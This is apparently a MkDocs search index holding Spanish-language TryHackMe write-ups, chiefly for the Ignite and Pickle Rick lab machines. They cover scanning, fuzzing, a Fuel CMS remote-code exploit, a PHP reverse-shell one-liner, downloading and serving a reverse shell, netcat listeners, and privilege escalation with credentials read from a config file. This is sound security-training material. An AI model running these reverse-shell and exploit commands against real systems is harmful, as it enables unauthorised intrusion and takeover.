{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"INDICE En este repositorio de guardan los write-ups de m\u00e1quinas y desaf\u00edos que completo en TryHackMe. El objetivo es documentar el proceso de resoluci\u00f3n de cada reto, proporcionando an\u00e1lisis paso a paso, t\u00e9cnicas utilizadas y aprendizajes clave. 1 - Blue 21 - Ignite 27 - Pickle Rick 28 - Daily Bugle Hecho por V\u00edctor Jim\u00e9nez Corada","title":"Home"},{"location":"#indice","text":"En este repositorio de guardan los write-ups de m\u00e1quinas y desaf\u00edos que completo en TryHackMe. El objetivo es documentar el proceso de resoluci\u00f3n de cada reto, proporcionando an\u00e1lisis paso a paso, t\u00e9cnicas utilizadas y aprendizajes clave. 1 - Blue 21 - Ignite 27 - Pickle Rick 28 - Daily Bugle Hecho por V\u00edctor Jim\u00e9nez Corada","title":"INDICE"},{"location":"1-BLUE/","text":"1 - Blue OBJETIVOS IP: PROCESOS","title":"1 - Blue"},{"location":"1-BLUE/#1-blue","text":"","title":"1 - Blue"},{"location":"1-BLUE/#objetivos","text":"IP:","title":"OBJETIVOS"},{"location":"1-BLUE/#procesos","text":"","title":"PROCESOS"},{"location":"21-IGNITE/","text":"21 - Ignite Procesos Escanear puertos sudo nmap -sV <SERVICE_VERSION> -O <OS> -T4 <INTENSIDAD> <IP> sudo nmap -sV -O -T4 10.10.56.241 -sV : 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) -O : No exact OS matches for host (If you know what OS is running on it, see Nmap OS submission ). -T4 : En un rango de 1 a 5 lo agresivo (ruidoso) que quieres que sea el escaneo Fuzzear feroxbuster -u <URL> -t <THREADS> -L <SCAN_LIMIT> -n <NO_RECURSION> -w <WORD_LIST> -o <OUTPUT> feroxbuster -u http://10.10.172.69:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o outputIgnite.txt Revisar pagina web Robot.txt User-agent: * Disallow: /fuel/ /fuel (Login page) user: admin password: admin Buscar vunerabilidades searchsploit <SERVICE> searchsploit fuel > ------------------------------- --------------------------------- Exploit Title | Path --------------------------------- --------------------------------- AMD Fuel Service - 'Fuel.service | windows/local/49535.txt Franklin Fueling Systems TS-550 | hardware/remote/51321.txt Franklin Fueling Systems Colibri | linux/remote/50861.txt Franklin Fueling Systems TS-550 | hardware/remote/51382.txt Franklin Fueling TS-550 evo 2.0. | hardware/webapps/31180.txt fuel CMS 1.4.1 - Remote Code Exe | linux/webapps/47138.py Fuel CMS 1.4.1 - Remote Code Exe | php/webapps/49487.rb Fuel CMS 1.4.1 - Remote Code Exe | php/webapps/50477.py Fuel CMS 1.4.13 - 'col' Blind SQ | php/webapps/50523.txt Fuel CMS 1.4.7 - 'col' SQL Injec | php/webapps/48741.txt Fuel CMS 1.4.8 - 'fuel_replace_i | php/webapps/48778.txt Fuel CMS 1.5.0 - Cross-Site Requ | php/webapps/50884.txt --------------------------------- --------------------------------- Shellcodes: No Results Explotar vulnerabilidad Descargar exploit y acceder a la shell https://www.exploit-db.com/exploits/50477 python3 50477.py -u http://10.10.172.69 Una vez accedido a la shell: ``` cat /home/www-data/flag.txt 6470e394cbf6dab6a91682cc8585059b ``` Mejorar la shell (Reverse shell): Descargar y descomprimir: ``` wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz tar -xvzf php-reverse-shell-1.0.tar.gz ``` Levantar web server en el directorio de la reverse shell para pasarla a la maquina objetivo: python3 -m http.server 80 Conectarme al servidor desde la maquina objetivo: wget http://10.21.104.33/shell.php Mejorar shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' Escuchar desde mi maquina con netcat: netcat -nvlp 8085 Cargar la sell en el navegador: http://10.10.172.69/shell.php Hacernos root: Buscar archivo de configuracion: cd /var/www/html/fuel/application/config Conseguir credenciales root e identidicarnos como root: ``` cat database.php user: root password: mememe ``` su root Acceder al directorio root (previamente oculto) y conseguir la flag: cd / cd root ``` cat root.txt b9bbcb33e11b80be759c4e844862482d ```","title":"21 - Ignite"},{"location":"21-IGNITE/#21-ignite","text":"","title":"21 - Ignite"},{"location":"21-IGNITE/#procesos","text":"","title":"Procesos"},{"location":"21-IGNITE/#escanear-puertos","text":"sudo nmap -sV <SERVICE_VERSION> -O <OS> -T4 <INTENSIDAD> <IP> sudo nmap -sV -O -T4 10.10.56.241 -sV : 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) -O : No exact OS matches for host (If you know what OS is running on it, see Nmap OS submission ). -T4 : En un rango de 1 a 5 lo agresivo (ruidoso) que quieres que sea el escaneo","title":"Escanear puertos"},{"location":"21-IGNITE/#fuzzear","text":"feroxbuster -u <URL> -t <THREADS> -L <SCAN_LIMIT> -n <NO_RECURSION> -w <WORD_LIST> -o <OUTPUT> feroxbuster -u http://10.10.172.69:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o outputIgnite.txt","title":"Fuzzear"},{"location":"21-IGNITE/#revisar-pagina-web","text":"Robot.txt User-agent: * Disallow: /fuel/ /fuel (Login page) user: admin password: admin Buscar vunerabilidades searchsploit <SERVICE> searchsploit fuel > ------------------------------- --------------------------------- Exploit Title | Path --------------------------------- --------------------------------- AMD Fuel Service - 'Fuel.service | windows/local/49535.txt Franklin Fueling Systems TS-550 | hardware/remote/51321.txt Franklin Fueling Systems Colibri | linux/remote/50861.txt Franklin Fueling Systems TS-550 | hardware/remote/51382.txt Franklin Fueling TS-550 evo 2.0. | hardware/webapps/31180.txt fuel CMS 1.4.1 - Remote Code Exe | linux/webapps/47138.py Fuel CMS 1.4.1 - Remote Code Exe | php/webapps/49487.rb Fuel CMS 1.4.1 - Remote Code Exe | php/webapps/50477.py Fuel CMS 1.4.13 - 'col' Blind SQ | php/webapps/50523.txt Fuel CMS 1.4.7 - 'col' SQL Injec | php/webapps/48741.txt Fuel CMS 1.4.8 - 'fuel_replace_i | php/webapps/48778.txt Fuel CMS 1.5.0 - Cross-Site Requ | php/webapps/50884.txt --------------------------------- --------------------------------- Shellcodes: No Results Explotar vulnerabilidad Descargar exploit y acceder a la shell https://www.exploit-db.com/exploits/50477 python3 50477.py -u http://10.10.172.69 Una vez accedido a la shell: ``` cat /home/www-data/flag.txt 6470e394cbf6dab6a91682cc8585059b ``` Mejorar la shell (Reverse shell): Descargar y descomprimir: ``` wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz tar -xvzf php-reverse-shell-1.0.tar.gz ``` Levantar web server en el directorio de la reverse shell para pasarla a la maquina objetivo: python3 -m http.server 80 Conectarme al servidor desde la maquina objetivo: wget http://10.21.104.33/shell.php Mejorar shell: python -c 'import pty; pty.spawn(\"/bin/bash\")' Escuchar desde mi maquina con netcat: netcat -nvlp 8085 Cargar la sell en el navegador: http://10.10.172.69/shell.php Hacernos root: Buscar archivo de configuracion: cd /var/www/html/fuel/application/config Conseguir credenciales root e identidicarnos como root: ``` cat database.php user: root password: mememe ``` su root Acceder al directorio root (previamente oculto) y conseguir la flag: cd / cd root ``` cat root.txt b9bbcb33e11b80be759c4e844862482d ```","title":"Revisar pagina web"},{"location":"27-PICKLE%20RICK/","text":"27 - Pickle Rick Objetivos Procesos Escanear puertos nmap <ip> -A -T4 -p <puertos_a_escanear> -oX <output.xml> nmap 10.10.156.68 -A -T4 -p 22,80 -oX pickleR.xml Fuzzeo feroxbuster -u <URL> -t <THREADS> -L <SCAN_LIMIT> -n <NO_RECURSION> -w <WORD_LIST> -o <OUTPUT> feroxbuster -u http://10.10.156.68:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o feroxBPickleR.txt Pagina web Inspeccionar codigo R1ckRul3s /robots.txt Wubbalubbadubdub /portal.php Posible XSS Reverse Shell Ver que la p\u00e1gina esta hecha en PHP a traves de Wappalizer (extension) buscar reverse sheel en internal all the things . php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' Cargar reverse shell: Escuchar en un puerto bash nc -nvlp 8085 Cargar script anterior en los comentarios de /portal.php : Escalada de privilegios Levantar servidor python: bash python3 -m http.server 80 Conectarme al servidor desde la m\u00e1quina objetivo bash wget http://10.21.104.33/shell.php","title":"27 - Pickle Rick"},{"location":"27-PICKLE%20RICK/#27-pickle-rick","text":"","title":"27 - Pickle Rick"},{"location":"27-PICKLE%20RICK/#objetivos","text":"","title":"Objetivos"},{"location":"27-PICKLE%20RICK/#procesos","text":"","title":"Procesos"},{"location":"27-PICKLE%20RICK/#escanear-puertos","text":"nmap <ip> -A -T4 -p <puertos_a_escanear> -oX <output.xml> nmap 10.10.156.68 -A -T4 -p 22,80 -oX pickleR.xml","title":"Escanear puertos"},{"location":"27-PICKLE%20RICK/#fuzzeo","text":"feroxbuster -u <URL> -t <THREADS> -L <SCAN_LIMIT> -n <NO_RECURSION> -w <WORD_LIST> -o <OUTPUT> feroxbuster -u http://10.10.156.68:80 -t 5 -L 5 -n -w /home/kali/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -o feroxBPickleR.txt","title":"Fuzzeo"},{"location":"27-PICKLE%20RICK/#pagina-web","text":"Inspeccionar codigo R1ckRul3s /robots.txt Wubbalubbadubdub","title":"Pagina web"},{"location":"27-PICKLE%20RICK/#portalphp","text":"Posible XSS","title":"/portal.php"},{"location":"27-PICKLE%20RICK/#reverse-shell","text":"Ver que la p\u00e1gina esta hecha en PHP a traves de Wappalizer (extension) buscar reverse sheel en internal all the things . php -r '$sock=fsockopen(\"10.0.0.1\",4242);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);' Cargar reverse shell: Escuchar en un puerto bash nc -nvlp 8085 Cargar script anterior en los comentarios de /portal.php : Escalada de privilegios Levantar servidor python: bash python3 -m http.server 80 Conectarme al servidor desde la m\u00e1quina objetivo bash wget http://10.21.104.33/shell.php","title":"Reverse Shell"},{"location":"28-DAILY%20BUGLE/","text":"28 - Daily Bugle Escaneo de puertos Escaneo simple sudo nmap 10.10.104.39 -sN Escaneo agresivo sudo nmap 10.10.104.39 -A -T4 -p 22 80 3306 Web Al usar el addon Wappalyzer se puede ver que el gestor de contenidos de la pagina es Joomla: Obtener versi\u00f3n de Joomla a trav\u00e9s de la herramienta Joomscan : joomscan -u http://10.10.104.39 Buscando vulnerabilidades para la versi\u00f3n 3.7.0 de Joomla encuentro la siguiente entrada en exploit-db.com : Buscando el CVE en internet llego al siguiente repositorio : Descargo el script de Python y exploto la vulnerabilidad:","title":"28 - Daily Bugle"},{"location":"28-DAILY%20BUGLE/#28-daily-bugle","text":"","title":"28 - Daily Bugle"},{"location":"28-DAILY%20BUGLE/#escaneo-de-puertos","text":"Escaneo simple sudo nmap 10.10.104.39 -sN Escaneo agresivo sudo nmap 10.10.104.39 -A -T4 -p 22 80 3306","title":"Escaneo de puertos"},{"location":"28-DAILY%20BUGLE/#web","text":"Al usar el addon Wappalyzer se puede ver que el gestor de contenidos de la pagina es Joomla: Obtener versi\u00f3n de Joomla a trav\u00e9s de la herramienta Joomscan : joomscan -u http://10.10.104.39 Buscando vulnerabilidades para la versi\u00f3n 3.7.0 de Joomla encuentro la siguiente entrada en exploit-db.com : Buscando el CVE en internet llego al siguiente repositorio : Descargo el script de Python y exploto la vulnerabilidad:","title":"Web"}]}